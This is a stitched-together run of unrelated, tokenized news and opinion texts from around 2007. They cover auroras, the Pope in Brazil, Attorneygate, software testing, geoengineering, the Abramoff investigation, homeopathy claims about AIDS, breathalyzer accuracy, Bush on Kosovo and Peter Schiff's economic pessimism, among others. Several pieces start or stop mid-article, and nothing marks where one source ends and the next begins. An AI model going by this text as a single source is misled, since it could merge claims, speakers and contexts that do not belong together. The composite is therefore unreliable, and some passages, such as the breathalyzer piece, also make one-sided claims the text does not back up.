But there is no reason for auroras to happen on the night side rather than the day side ; they are just more visible to the satellite 's instruments .
The most active part of the ring moves as the earth 's magnetic field shifts .
The field shifts because of changes in the solar wind , and also because of the currents that cause the aurora .
Here is a spectacular movie of an aurora , in which you can see the auroral ring changing shape
It was made from satellite images using far ultraviolet light .
Can you imagine how people could learn about the auroral ring , before there were satellites ?

SAO PAULO , Brazil — Pope Benedict XVI reaffirmed the Roman Catholic Church 's opposition to abortion in his first speech in Brazil but avoided further suggestion that politicians who support abortion rights should be considered excommunicated .
Benedict is on his first papal trip to Latin America , where women 's rights groups have been pushing to expand access to abortion .
With few exceptions , the procedure is illegal in Brazil and most other countries in the region , home to more than half the world 's 1.1 billion Catholics .
The pope , who will inaugurate an important regional bishops ' conference during his trip , was met at Sao Paulo airport Wednesday by Brazilian President Luiz Inacio Lula da Silva .
Speaking in Portuguese , Benedict said he 's certain that the bishops will reinforce " the promotion of respect for life from the moment of conception until natural death as an integral requirement of human nature . "
Benedict 's comments came just hours after one of the president 's Cabinet members said a " macho " culture in Brazil has prevented a legitimate debate about legalizing abortion in Latin America 's largest nation .
" If men got pregnant , I 'm sure this question would have been resolved a long time ago , " said Health Minister Jose Gomes Temporao , who is pushing for a referendum on the issue .
Like most Brazilians , Silva says he 's opposed to abortion .
But in an interview aired on Catholic radio stations earlier in the week , he said abortion was an issue for his government because of the many illegal — and often fatal — abortions performed in clandestine clinics in Brazil .
Silva 's spokesman said the president did not intend to bring up abortion during a second scheduled meeting with Benedict .
This morning , thousands of Brazilians streamed down barricaded streets toward the Pacaembu soccer stadium , where the pope was scheduled to preside over a ceremony for young people .
About 41,000 people were invited , but officials expected at least 100,000 more to gather outside .
Not all agreed with the church .
" Until the church broadens its scope of action to include the dispossessed , the poor and the hungry and youth , the evangelical sects are going to continue gaining ground in Brazil , " said Charles Marinho de Souza , 27 - year - old union activist and member of a Catholic youth group .
Even before Benedict got off his plane , he stoked a debate among Catholics who have been arguing whether politicians who approve abortion legislation as well as doctors and nurses who take part in the procedure subject themselves to automatic excommunication under church doctrine .
During the flight from Rome , Benedict gave his first full - fledged news conference since becoming pontiff in 2005 .
When a reporter pressed Benedict on whether he agreed that Catholic politicians who recently legalized abortion in Mexico City should rightfully be considered excommunicated , the response was " Yes . "
Church law says anyone who procures a completed abortion is automatically excommunicated .
But considering political support for abortion as equivalent to procurement would set new Vatican policy .
Benedict 's spokesman , the Rev. Federico Lombardi , later said the pope was not setting a new policy and did not intend to formally excommunicate anyone — a rare process under church law separate from the doctrine of self - excommunication .
But Lombardi added that politicians who vote in favor of abortion should not receive the sacrament of Holy Communion .
" Legislative action in favor of abortion is incompatible with participation in the Eucharist .
... Politicians exclude themselves from Communion , " he said .
As many as 20,000 faithful waited in cold rain for a glimpse of Benedict in South America 's largest city , then chanted " Bento , Bento " and waved flags of different South American nations as he greeted them in Portuguese and Spanish blessed them in Latin .
As well as abortion , Benedict is expected to address other challenges to Roman Catholicism during his trip , including the church 's declining influence in Brazil , the rise of evangelism and a deep divide between rich and poor .
The Vatican also has promised that Benedict will deliver a tough message on poverty and crime during his five - day visit to the world 's most populous Roman Catholic country .
Benedict 's predecessor , John Paul II , visited Mexico and addressed Latin American bishops just three months after assuming the papacy .
Benedict has waited two years for his first trip to the region , but he denied being " Eurocentric " or less concerned about poverty in the developing world than his predecessors .
" I love Latin America .
I have traveled there a lot , " he told reporters , adding that he is happy the time had come for the trip after focusing on more urgent problems in the Middle East and Africa .
Benedict , who visited Brazil as then - Cardinal Joseph Ratzinger in 1990 , will celebrate several open - air Masses , including a canonization ceremony for Brazil 's first native - born saint , and visit a church - run drug and alcohol rehabilitation center .
The tour ends on Sunday , when he will open the conference of Latin American and Caribbean bishops in the shrine city of Aparecida .

Top ‘ Attorneygate ’ investigator : No ‘ blind faith ’ for the White House
Michael Roston
On a 7 - 3 ruling , House Democrats moved rapidly Thursday afternoon to rule that the White House had asserted executive privilege in a manner that was ‘ not legally valid . ’
During the proceedings , a top House Democratic investigator of the firing of nine US Attorneys said that the White House ’s latest moves were not consistent with the current system of government in the United States .
Another top Democrat accused the White House of turning over ‘ inaccurate ’ information about Karl Rove ’s role in the attorney firings .

Every now and then some ingenious project manager thinks of a way to deliver faster by negotiating to skip testing .
At first glance , this looks like a win - win deal : customers get software faster or cheaper , as long as they “ understand ” that there will be problems .
Developers , on the other hand , get more time to focus on new features .
In reality , that is just one big lie , and a very dangerous one .
##No testing = not working
The problem , like a lot of similar issues , comes from basic misunderstandings .
“ No testing ” simply means a completely different thing to customers than it does to developers .
Customers accept that there will be some bugs to be flushed out later .
But they expect the system to generally work .
For developers , “ no testing ” has a literal meaning as in zero testing - a get out of jail free card , which allows us to ship something as soon as it compiles .
Without a doubt , this approach guarantees major problems in delivered software .
Even with good unit test coverage , skipping final integration testing is a big gamble on whether the components will work together correctly .
And the odds say that something will fail .
I lost count of times when a system delivered without testing was not able to perform key business functions .
In the eyes of developers , the problem might have been a misplaced bracket or five lines of untested code – easily fixed when spotted .
Most of the code is there , so programmers think that the work was done .
In the eyes of customers , such a system is completely useless .
It does not matter that hundreds of thousands of lines of code were written if the damned thing breaks during a login .
###Three quotes to remember Programming and testing together is faster than just programming – Kent Beck , Extreme Programming Explained Nobody ever remembers a late delivery , just a bad one – Bruce Robinson , How to get ahead in advertising Build half a product , not a half - ass product – 37 Signals , Getting Real </div >
“ No testing ” deliveries are completely pointless and should be avoided at all cost .
They do no good .
No buts , no exceptions .
Customers will find the software unusable .
Because of all the complaints that are sure to come , developers will have to jump into a panic - mode bugfixing race straight after the delivery .
And , technically , that is the testing part of the project that had to be done .
There will have to be a bugfix release later , so the software was not even delivered earlier .
The first deployment is just a waste of time , and there are no benefits from it .
Skipping testing does not speed up deliveries , it makes them even later .
Kent Beck put this nicely in XP Explained : “ Programming and testing together is faster than just programming ” .
##Better late then crap
When pressed to complete his task faster , Richard E. Grant ’s character in How to get ahead in advertising has a great reply : “ Nobody ever remembers a late delivery , just a bad one ” .
Being late is bad , and causes a lot of stress - especially among project managers who start looking for loopholes .
But when compared to delivering crap , delivering late is definitely the lesser of two evils .
Agreeing to skip testing in order to speed up development is no better than closing our eyes and sitting on a time - bomb , waiting for it to explode .
When things go bad , and there is no chance to meet the deadline , the best thing to do is to split the delivery .
So one part will be delivered on time , with less features .
That gives customers something to play with , or even start working .
The rest of the features can get delivered a bit later .
In my experience , cutting the scope is much tougher to agree on than “ No testing ” , but a much better way forward .
As the opening paragraph of chapter 5 of Getting Real by 37 Signals advises : “ Build half a product , not a half - ass product ” .
If you find yourself in a situation to have to speed up the delivery , my advice is to sit down with customers , explain the situation , and ask them to choose top priorities from the list of unfinished tasks .
Then deliver what you can , but do it properly .

WASHINGTON ( AFP ) -
He sleeps on a bench , but he is king of chess during the day at Washington 's Dupont Circle , where he dazzles beginners and masters alike with his winning moves on the park 's stone chessboards .
Tom Murphy , 49 , makes what little money he has from teaching his prodigious knowledge of the game to passersby for a few dollars .
" He has the title of expert in chess .
This is the second highest American title ; above him are master .
So it means he is quite good , " said Washington 's Chess Center director David Mehler .
A former math and science major and a celebrity among amateurs , Murphy has made the Dupont Circle public square America 's most prestigious chess park after New York 's fabled Washington Square , according to some chess lovers .
" The mathematical equation has always been fascinating to me , then when you add the camaraderie , the ambiance , the open air , it 's almost irresistible , " said Murphy , peering over a park chessboard that draws players from all walks of life -- students , doctors , lawyers , drunkards .
Garrulous and brilliant , Murphy , grew up in North Carolina and Philadelphia , Pennsylvania , two well known chess centers , and specializes in a lightning version of chess known as " blitz . "
In this accelerated version of the ancient game , players are allowed five minutes for all their moves , and the game ends within 10 minutes .
" The appeal of blitz is that , maybe in two or five minutes , I may put together a work of art that might last a life time , " Murphy said in his inimitable style of explaining chess basics .
The game , he said consists of " few guiding principles : king safety , fight for the center , give every piece a job . "
" At blitz he is a very strong player .
He has a very fast mind and he sees combinations very quickly .
He calculates very quickly , " said Mehler , who has been teaching the board game to underprivileged children for 15 years .
Murphy has won several chess tournaments and finished 15th in the 2005 world blitz championship .
He 's not always down and out , but his addiction to booze often lands him on the street .
" The pursuit of the ego versus the pursuit of the spirit are in conflict sometimes , " he explained .
" I enjoy alcohol a little too much . "
He attends Alcoholic Anonymous meetings and admits , " when I do n't drink my chess is better . "
Murphy aims to get better at chess and rise to the title of master .
" I would dearly love to go on and make my master 's rating because through that I get a credibility to increase my teaching fee , " he said .
" There is an upcoming tournament on Thanskgiving ( November 22 ) in Philadelphia .
That 's looking promising , " he added .
For now , the homeless chess teacher charges 20 to 30 dollars an hour and will match his wits with any rival for two to five dollars per game .
" Grand masters are teaching 100 or 200 bucks ( dollars ) an hour , masters can get at least 50 , that 's not bad , " he said .

10 Best Places To Go For Weird News
Stanford climatologist Ken Caldeira examines a simulation of atmospheric alterations aimed at combating global warming .
New research indicates that hacking the atmosphere – pumping microscopic particles into the stratosphere or clouds to block sunlight and offset global warming caused by greenhouse gases – is imminently possible .
The problem is we could never , ever stop doing it .
Climate scientists Damon Matthews of Concordia University and Ken Caldeira of Stanford ran the numbers on atmospheric geo-engineering through a climate simulation and found that while cranking out carbon dioxide at business - as - usual rates we can geo - engineer our way back toward pre-industrial temperatures in short order , reaching 1900 levels in about five years .
Not only that , it would be fairly cheap and easy to do .
Pumping 20 to 25 liters of aerosols per second to keep enough particles in the stratosphere would cool temperatures , causing the planet 's carbon sinks to suck more carbon dioxide out of the atmosphere .
" That kind of flow rate can be handled by a single fire hose , " said Caldeira .
" For something like $ 100 million a year you could probably keep a hose in the stratosphere suspended by an array of balloons with pumps along the way . "
The problem is what happens if we stop short or screw it up .
Bring the geo-engineering process to a halt , and those sun-warmed carbon sinks spit the carbon dioxide right back into the atmosphere .
The rebound warming , to temperatures that would have been reached without the geo-engineering , would be 10 to 20 times the pace of today 's global warming .
The rapid warming , up to 7 degrees Fahrenheit per decade , would wreak havoc on the planet and threaten civilization .
To prevent disaster , the geo-engineering process would have to continue as long as carbon - dioxide levels were elevated .
A quarter of the carbon dioxide that comes out of your car 's tailpipe is still in the atmosphere a thousand years later , Caldeira said .
" We 've never had systems work for a thousand years without failure , " he added .
Even without technical failures , other circumstances including a world war , economic collapse or a simple change of political will could turn off the hose .
Matthews and Caldeira 's study underscores the need for any country that attempts geo-engineering to make a durable and long - term commitment to the effort , said David Victor , an energy and sustainable development specialist at Stanford Law School .
" It 's a bit like riding a bicycle down a steep hill without brakes , " he said .
The idea of injecting particles into the stratosphere to block sunlight has hovered just beyond the bounds of scientific respectability since Soviet climatologist Mikhail Budyko first suggested it in the '70s .
That changed last year when Nobel laureate Paul Crutzen published an essay calling for scientists to seriously consider the possibility .
( See " This Global Warming Fix Stinks . " )
But studying geo-engineering is not the same as doing it , and Crutzen said that this latest research shows the significant risks involved in counteracting global warming induced by carbon dioxide .
" Far better to reduce the emissions of CO2 , " he said .
For Caldeira the danger is not in geo- engineering itself but in the risk that politicians will turn to it to avoid the hard work of transforming our energy and transportation systems .
" If somebody is driving an SUV , I would be against deploying geo-engineering .
If there is a coal - fired power plant still spewing carbon dioxide into the atmosphere , I would be against geo-engineering . "
We should think of geo- engineering only as a parachute , said Caldeira .
It 's something you desperately hope you never need .

Belching Bovines Are Bad for the Environment : How to Clear the Air
New Phytoplankton Model May Revise Warming Estimates
Global Warming : Be Very Afraid
Everything the White House looks at , touches , smells , hears , or thinks about has executive privilige .
Waxman :
The White House is withholding hundreds of pages of documents about the activities of convicted lobbyist Jack Abramoff on the grounds that these documents involve internal White House deliberations .
Unless the President is prepared to assert executive privilege over these documents , they should be turned over to the Oversight Committee without further delay .
When Mr. Abramoff pleaded guilty to corruption charges in January 2006 , White House officials stated emphatically that Mr. Abramoff was a virtual stranger to the White House .
President Bush said , “ I do n’t know him . ”
White House spokesman Scott McClellan asserted that “ there were only a couple of holiday receptions that he attended , then a few staff - level meetings on top of that . ”
Through a spokesperson , Karl Rove , then Senior Advisor to the President , said , “ Mr. Rove remembers they had met at a political event in the 1990s .
…
Since then , he would describe him as a casual acquaintance . ”
Ken Mehlman , the former Director of the White House Office of Political Affairs , said : “ Well , Abramoff is someone who we do n’t know a lot about . …
We know what we read in the paper . ”
The Committee ’s subsequent review of thousands of documents obtained from Mr. Abramoff ’s former firm , Greenberg Traurig , raised questions about these White House statements .
According to the Greenberg Traurig documents , which were summarized in a bipartisan staff report released last year , Mr. Abramoff and his associates had hundreds of lobbying contacts with White House officials , billed clients more than $ 24,000 for meals and drinks with White House officials , and provided White House officials with high - priced tickets to sporting and entertainment events .
The documents also described a series of actions by White House officials that benefited Mr. Abramoff and his clients , as well as requests from Mr. Abramoff that White House officials did not act upon .
In response to the Committee ’s bipartisan staff report , the White House emphasized that the report was based solely on Mr. Abramoff ’s own records .
White House spokesman Tony Snow told reporters that it is “ very difficult within the report itself to figure out how many actual contacts there are ” and that “ there ’s a great deal of bewilderment about what ’s true and what ’s false . ”
At the same time the White House promised full public accountability .
Mr. Snow stated that the White House is “ going to take a serious look at ” the findings of the report , telling reporters , “ we want to find out what the truth is . ”
When asked by a reporter if he would let the public know “ the full results of that review once you have it , ” he stated clearly , “ you will know what the results are . ”
This year , the Committee has sought to conclude its investigation by requesting ( 1 ) depositions with White House officials and former Abramoff lobbyists and ( 2 ) documents from the White House .
The investigation has encountered obstacles because four witnesses , including individuals who worked in the White House , have raised Fifth Amendment concerns .
Despite the refusal of key witnesses to provide testimony , the Committee has learned that some senior White House officials had regular contact with Mr. Abramoff .
Former White House political director Matt Schlapp cooperated with the Committee ’s investigation and provided voluntary testimony in a deposition .
Mr. Schlapp estimated that he had “ monthly ” contact with Jack Abramoff on subjects that often involved official government business .
He also told the Committee that Mr. Abramoff and his associates “ had many friends in the administration ” ; that Mr. Abramoff was regarded as a “ point of information ” because of “ his knowledge and his experience and his judgment on issues surrounding politics and policy and how the town works ” ; and that Mr. Abramoff ’s lobbying team was “ viewed by many as a very respected lobbying team . ”
In response to the Committee ’s document request , the White House produced approximately 3,700 pages of documents .
These documents generally involve communications between White House officials and Mr. Abramoff or members of his lobbying team .
The White House refused , however , to produce over 600 pages of documents relating to Mr. Abramoff because they “ contain internal deliberations among White House employees , or that otherwise implicate Executive Branch prerogatives . ”
The White House also made a number of redactions in the pages produced to the Committee .
Given the prior statements by White House officials , it is surprising that there would be this volume of documents of internal deliberations involving Mr. Abramoff .
If you are a young Muslim American and head off to the Middle East for a spell in a fundamentalist “ madrassa , ” or religious school , Homeland Security will probably greet you at the airport when you return .
But if you are an American Jew and you join hundreds of teenagers from Europe and Mexico for an eight - week training course run by the Israel Defense Forces , you can post your picture wearing an Israeli army uniform and holding an automatic weapon on MySpace .
The Marva program , part summer camp part indoctrination , was launched in Israel in 1981 .
It allows participants , who must be Jewish and between the ages of 18 and 28 , to fire weapons , live in military barracks in the Negev desert and saunter around in an Israeli military uniform saluting and taking long hikes with military packs .
The Youth and Education Corps of the Israel Defense Forces run four 120 - strong training sessions a year .
“ Upon arrival , the participants experience an abrupt change into army life : wearing uniforms , accepting army discipline , and learning the programs and lessons integral to the program , ” the Let Israelis Show You Israel Web site reads .
“ The program includes military content such as : navigation , field training , weapons training , shooting ranges , marches and more , as well as educational content such as : Zionism , Jewish Identity , history and knowledge of the land of Israel .
All of this is taught in Hebrew in an intensive eight weeks . ”
“ The participants finish the program after completing a short , intensive , exhilarating military experience that allows them to taste Israel in a way that they never could before — as part of the Israel Defense Forces , ” the site reads .
“ They leave the program with a feeling of belonging and a strong connection to Israel , and many return to Israel to continue the connection that was created in the framework of the Marva course . ”
There are , of course , gushing testimonials about the program .
“ I spent the first few days of Marva doubting my decision , wondering why I had come , wondering if there was any way out .
With all of the running , yelling orders , discipline and Hebrew , I felt horribly out of place , ” writes Canadian David Roth of his summer .
“ It was a completely different world from the one I was used to .
All that changed , though , by the end of the first week .
We had our first ‘ Masa ’ ( Hike ) .
It was very hard , but at the end , we all knew , our M16s were waiting for us at the ‘ tekes ’ ( Ceremony ) .
We got through the 8 kilometers and had our ‘ tekes ’ and got our guns .
It felt amazing , and from that point on Marva was incredible . ”
How have we reacted when we discovered that American Muslims were being taught in a foreign country to fire machine guns at paper figures and simulate military maneuvers ?
And what about the summer schools in Gaza organized by Islamic Jihad designed to train young Palestinians in the basics of military life ?
These Gaza camps , uncovered in 2001 , were widely denounced by Israel as proof that the Palestinians were teaching their children to hate and kill .
The argument in favor of camps in Israel , as opposed to camps in Pakistan , is that these young men and women are not going to come back and use what they have learned to harm Americans .
They are not terrorists .
Muslims , however , have not cornered the market on terrorism and violence .
Radical Jews have also been involved in terrorist attacks in Israel and the United States .
I discovered an American in Israel in 1989 named Robert Manning .
A huge , burly man , Manning was living in the West Bank Jewish settlement of Kiyrat Arba .
When I found him he was carrying a pistol , a large knife strapped to his leg and an M - 16 assault rifle .
He was part of a Jewish terrorist group called Committee for Protection and Safety of the Highways that set up ad hoc roadblocks and pulled Palestinians from cars to beat and often shoot them .
He was a follower of Meir Kahane , the leader of the Jewish Defense League , who was implicated in terrorist attacks in the United States and Israel .
Manning served as a reservist in the Israel Defense Forces in the West Bank .
Manning was wanted in California for murder .
He had been charged in a 1980 mail - bomb killing as part of his involvement in the Jewish Defense League .
The bomb was intended for the owner of a local computer firm , but the package holding the device was opened by the firm ’s secretary , Patricia Wilkerson , who was killed instantly by the blast .
Manning , full of bluster and a bitter racism toward Arabs , used as his pseudonym the name of the FBI agent in charge of his case , a bit of humor that backfired on him by confirming my suspicion of his identify .
I obtained the picture from his California driver ’s license and showed it to his neighbors at Kiyrat Arba .
They identified him from the photo .
I wrote an article affirming that Manning , heavily armed and an active member of the Israeli army , was living in a Jewish settlement .
The Israeli government , until that moment , said it had no information about his location .
He was extradited in 1993 and sentenced the next year to life imprisonment without the possibility of parole for 30 years .
He is in a maximum - security prison in Florence , Colo .
Those who go through the Marva summer program are indoctrinated as thoroughly as Muslims who go overseas and are told they are part of a greater jihad for Islam .
The results , given Israel ’s close alliance with the United States , may not be negative for those in power in the United States , but it may be very negative for those Americans defined as the enemy , especially Muslims , should we suffer another 9/11 .
The program inculcates hatred and a belief in the efficacy of violence to solve the problems in the Middle East .
It identifies Israel with militarism .
It feeds the idea that a Jew born in Brooklyn has a birthright to settle in Israel that is denied to an American of Palestinian descent .
Jerusalem , aside from being one of the most beautiful cities in the world , is one of the most literate , creative and intellectual .
Do these young men and women really know the best of Israel by spending eight weeks playing soldier and glorifying the military ?
Is the cause of Israel advanced by mirroring the twisted militarism of Islamic fundamentalists ?
Terrorists arise in all cultures , all nations and all religions .
We have produced more than our share .
Ask the people of Vietnam or Iraq .
The danger of a military program such as these is that it solidifies a mind - set of us and them .
It romanticizes violence .
It widens the divide that leads to conflict .
It makes dialogue impossible .
There are great Israeli institutions , from the newspaper Haaretz to the courageous Israeli human rights organization B’Tselem to Peace Now .
A summer working for them , rather than wearing an army uniform , unleashing bursts of automatic fire in the desert and singing Israeli patriotic songs , might actually help .

Okay now look : there ’s nothing wrong with the idea of homeopaths giving out sugar pills .
The placebo effect can be very powerful , because it ’s not just about the pill , it ’s about the cultural meaning of the treatment : so we know from research that four placebo sugar pills a day are more effective than two for eradicating gastric ulcers ( and that ’s not subjective , you measure ulcers by putting a camera into your stomach ) ; we know that salt water injections are a more effective treatment for pain than sugar pills , not because salt water injections are medically active , but because injections are a more dramatic intervention ; we know that green sugar pills are a more effective anxiety treatment than red ones , not because of any biomechanical effect of the dyes , but because of the cultural meanings of the colours green and red .
We even know that packaging can be beneficial .
Similarly we know that sugar pills have no physical side effects .
This is great , because there are a lot of people for whom there is little effective biomedical treatment : a lot of back pain , for example , or medically unexplained fatigue , most colds and flu , and so on .
Going through a theatre of medical treatment , trying every pill in the book , will only elicit side effects , so a sugar pill might be a great remedy .
In the great 19th century cholera epidemic of London , after all , survival rates at the homeopathic hospital were better than the medical hospitals , not because homeopaths could cure cholera , but because nobody could , and while ineffective medical treatments of the time like bloodletting carried risks , sugar pills were at least harmless .
Homeopaths would be fine , if they could just shut up about serious stuff , like Aids , malaria , and MMR .
This week I received a flier for a conference being organised by the Society of Homeopaths ( “ representing professional homeopaths ” ) , the biggest professional organisation for homeopaths in the UK .
“ Join us at this one - day Symposium in London for a fascinating insight into the role of homeopathy in treating HIV / AIDS . ”
It ’s a pretty fascinating flier .
“ In searching for an effective remedy for treating the AIDS - epidemic in Africa , the UK - homeopath Peter Chappell discovered a method to design remedies fitting the totality of a disease .
These remedies are now known as PC - remedies . ”
In case you ’re wondering how he makes them , Peter explains on his own site how he “ creates a holistic mirror energy / information set to the disease using a special process he does not yet disclose . ”
He also sells energy wave patterns on iTunes .
They sound like jazz – I am listening to Aids one right now – but this is simply the “ carrier ” , on which the healing “ resonance ” is “ engrafted ” .
“ Modern quantum physics is confirming resonance works on all levels of existence , ” he says .
The Society ’s conference materials are gushing .
“ He [ their lecturer ] observed that in just a few days or weeks patients become symptom free and able to return to their jobs and schools or to look after their children again .
Harry believes that using the PC1 remedy , the AIDS epidemic can be called to a halt , and that homeopaths are the ones that can do it . ”
On his own site , Harry is even more explicit : “ PC1 for HIV / AIDS works ” .
How well ?
“ In all cases . ”
Placeboes are great , but when their right to make stuff up is flattered too hard , people can get carried away , and homeopathy has a bad history in this regard .
A Newsnight undercover survey caught out ten who were cheerfully recommending people to use ineffective homeopathic malaria prophylaxis when travelling to high risk areas , giving no sensible advice to accompany it ( the Society of Homeopaths found no case to answer on conduct complaints arising from this ) .
A published undercover survey , with a researcher posing as a mother asking for vaccine advice , polled 77 homeopaths : not one advised her to give MMR to her child , and a third actively advised against it .
Meanwhile a current Early Day Motion defending homeopathy and its NHS clinics has attracted 200 signatories , including players like Frank Dobson , Glenda Jackson , Simon Hughes , Diane Abbott , Lembit Opik , Ann Widdecombe , Malcolm Rifkind , and more .
Making stuff up is the homeopath ’s trade .
Attacking medicine is their marketing device .
It ’s probably harmless , and arguably helpful , but only if you are absolutely certain that you can manage those two risks .
I see no sign of critical self - appraisal within the profession .

More on the cholera story
in this excellent book on John Snow
And for more on placebo
you ca n’t beat Moerman .
TheGardenLady received this question from Jenny .
I am growing lemon cucumber this year for the first time on a trellis in my garden in the Chicago area .
I have many plants that are thriving and have dozens of blossoms .
My problem is that only one blossom has set fruit so far .
The plants get about 8 hours of sun and otherwise look very healthy .
I have a newly planted garden bed that I created out of vermiculite , peatmoss , and compost .
The Kentucky wonder beans growing on the same trellis are fruiting ( I have picked several meals of beans over the last 4 weeks ) but the cucumbers are not .
The lemon cucumber is an heirloom cucumber which means that when you get fruit you can save the seeds and plant them next year , they will grow true to the parent .
It sounds like you are doing everything right with your planting .
You also say that your plants are healthy which means that you have n’t seen cucumber beetles .
That is excellent .
So the problems sounds like it has something to do with pollination .
Male flowers generally appear 2 weeks before the female flowers on the cucumber .
For an illustration of a male and female flower go to this site .
The first 10 or 20 flowers are male and do not produce fruit , they will drop off .
Perhaps your female flowers have not started blooming .
You can be patient and wait to see if you get more fruit .
Cucumbers need bees to pollinate them .
There has been a dearth of honey bees in some areas .
You may want to try pollinating the flowers on your plants .
You can tell the female flower from the male flower because the female flower has a small bud beneath it .
Take a Q - Tip and first swirl it in the male flower .
Then find a female flower and take that same Q-tip and swirl it in the female flower .
Then watch to see if fruit form .
Good Luck and please let TheGardenLady ’s readers know if you have success .

In 1990 , the New Jersey courts declared that the science was settled , the debate was over : breath analysis is a reliable and accurate means by which to determine blood alcohol content ( BAC ) .
This proclamation is known as the “ Downie decision . ”
The lead witness , who held the most sway in the court ’s opinion , was Dr. Dubowski , a forensic scientist with a history of research experience dealing with Breathalyzers and alcohol breath analysis .
A study he published in 1985 was considered the pre-eminent work in this field .
The Downie case revolved around the accuracy of breath analysis in terms of serving as a surrogate for actual BAC .
One aspect would be of particular importance from the defendant ’s perspective ; how often does the alcohol breath analysis regimen overstate actual BAC ?
Dr. Dubowski testified that his research determined that in only 2.3 percent of the tests did the breath reading overstate the actual BAC .
This was the first time this number was made publicly available ; it had not been presented in his 1985 report .
Another witness in the Downie case , Dr. Gerald Simpson , a physical chemist also testified , and attempted to describe the variables that could render a Breathalyzer reading inaccurate .
The court largely disregarded his testimony in favor of the assured endorsement of breath analysis offered by Dr. Dubowski .
The court determined that the use of breath alcohol was scientifically valid for the purpose of determining BAC .
Was that the end of the story ?
Not quite .
After the Downie trial , Dr. Simpson obtained the actual data from Dr. Dubowski ’s 1985 report .
In applying the same analysis to the data that Dr. Dubowski used , Dr. Simpson discovered a major error .
The incidences when breath analysis overstated actual BAC were not 2.3 percent of the tests , as Dr. Dubowski had testified to in the Downie case , but rather 23 percent of the tests – a wandering decimal point !
Dr. Simpson then published his findings in a respected scientific journal .
They were never rebutted and Dr. Dubowski remained silent on the subject .
Attorneys across the country have taken note of the breathalyzer ’s failings .
This has lead authorities to resort to more invasive measures , including letting officers perform blood draws with very little training .
Recent research proves that measuring breath to determine actual BAC is a horrendously flawed concept .
Errors can approach 50 percent !
Still , even 15 years ago it was known and could be proven that in almost one quarter of Breathalyzer tests the readings were higher than the actual BAC .
How many thousands of people had their lives turned upside down , suffered major financial losses , lost jobs , and had their reputations destroyed by a system that used junk science to push its agenda ?
Bush at a press conference on Saturday :
Q : And on the deadline [ for Kosovo independence ] ?
Bush :
In terms of the deadline , there needs to be one .
This needs to come — this needs to happen .
Now it ’s time , in our judgment , to move the Ahtisaari plan .
There ’s been a series of delays .
You might remember there was a moment when something was happening , and they said , no , we need a little more time to try to work through a U.N. Security Council resolution .
And our view is that time is up .
Bush at a press conference on Sunday :
Q : Thank you , Mr. President .
Yesterday you called for a deadline for U.N. action on Kosovo .
When would you like that deadline set ?
And are you at all concerned that taking that type of a stance is going to further inflame U.S. relations with Russia ?
And is there any chance that you ’re going to sign on to the Russian missile defense proposal ?
Bush :
Thanks .
A couple of points on that .
First of all , I do n’t think I called for a deadline .
I thought I said , time — I did ?
What exactly did I say ?
I said , “ deadline ” ?
Okay , yes , then I meant what I said .
At which point assembled reporters started laughing at him .
Kevin asked , “ [ I ] s it really too much to ask the president of the United States to take his own policies seriously enough to actually know what they are ? ”
Apparently so .

Peter Schiff is laughing at me .
I ’ve just asked him to entertain the following notion : that we dodged a bullet during August ’s financial - market turmoil and , with the stock market bouncing right back from every dip , things might be okay .
So why worry ?
He stops laughing .
“ Why worry ? ” he asks .
“ Because we dodged a bullet but are about to step on a hand grenade . ”
Sitting in a corner office of a nondescript building just off I -95 in Darien , Connecticut , Schiff , the president of brokerage Euro Pacific Capital , and author of Crash Proof : How to Profit From the Coming Economic Collapse , will spend the next hour spelling out a singularly pessimistic view of the American economy .
And he will do so while exhibiting a curious juxtaposition unique to the bearish prognosticator :
He speaks of disaster with a smile on his face .
No , he ’s not happy about our impending doom .
But he is happy that people are finally taking him seriously .
Some people , anyway .
The recessionary fears that were sparked by the global liquidity crisis in August have eased , largely because of a resilient stock market and a belief that the Federal Reserve ’s interest - rate cut in September curtailed deeper losses .
When Goldman Sachs invested in its own imploding Global Equity Opportunities hedge fund in August , calling it an “ opportunity ” and not a “ rescue , ” people laughed .
Guess who laughed last ?
Goldman , which had reportedly enjoyed a $ 370 million gain on its $ 2 billion rescue by October .
The optimists stay focused on stories like Steve Jobs ’s next stroke of genius .
But Schiff , whom CNBC calls “ Dr. Doom , ” has not , as bears do when winter approaches , gone off to hide in a cave .
Why not ?
Because every single one of the underlying economic factors that he has identified as cause for concern has worsened .
And his is no longer a lone voice in the woods .
If you do n’t care to listen to a man nicknamed Dr. Doom , you can listen to people like former Federal Reserve chairman Alan Greenspan , esteemed bond - fund manager Bill Gross , or famed money manager Jeremy Grantham .
They ’re part of a growing chorus of voices that are saying many of the same things as Schiff .
Their bearish arguments come in many shapes and sizes , but here ’s the basic one :
The past five or six years have been deceptively fortunate ones for the U.S. economy .
That ’s because any troublesome developments — the surge in oil prices from $ 28 per barrel in 2003 to about $ 87 today , for example — have been papered over by rising home prices .
Home equity has been used to buy flat - screen TVs , SUVs , and more homes .
Wall Street bought up all this debt from lenders , thereby allowing them to lend more .
The softening of real - estate prices in most parts of the United States put a crimp in this system , but it has n’t stopped it .
The question is , what , if anything , will ?
What will bring on the apocalypse that Schiff and others believe is inevitable ?
They see it like this :
THREAT NO .

The Bottom Continues to Fall Out of the Housing Market
Manhattan ’s gravity - defying real estate aside , it ’s quite clear the nation is experiencing a genuine housing crisis .
In August , pending home sales dropped 6.5 percent , and they currently sit at their lowest level since 2001 .
The National Association of Realtors conducted a recent survey that showed more than 10 percent of sales contracts fell through at the last moment in August , primarily owing to disappearing loan commitments from banks .
The crisis will only deepen , when more borrowers see their adjustable - rate mortgages adjusted upward .
There was a foreclosure filing for one of every 510 households in the country in August , the highest figure ever issued , and by one estimate , more than 1.7 million foreclosures will occur in the country by the end of 2008 .
That ’s not just subprime borrowers : According to the Federal Housing Finance Board , while nearly 35 percent of conventional mortgages in 2004 used ARMs , some 70.7 percent of jumbo loans — those above $ 333,700 ( the jumbo threshold in 2004 ; it ’s now higher ) — did too .
Historically , bond - market investors have been the boring counterparts to their equity - market brethren .
But in his October Investment Outlook , famed bond investor Bill Gross was anything but .
The managing director of money management firm pimco pointed out that the Federal Reserve is caught in a bind :
It must continue to lower interest rates to ameliorate this burgeoning housing crisis , but in doing so , it “ risks reigniting speculative equity market behavior , and … a run on the dollar . ”
( More on the dollar later . )
Gross does n’t have the answers but observes that the Fed is “ in a pickle , and a sour one at that . ”
Worse yet , concerns that a rate cut might be inflationary actually caused bond yields to rise in the wake of the rate cut , something that does n’t normally happen .
The Fed ’s influence , always overstated , might turn out to be nonexistent in a credit market that remains on edge .
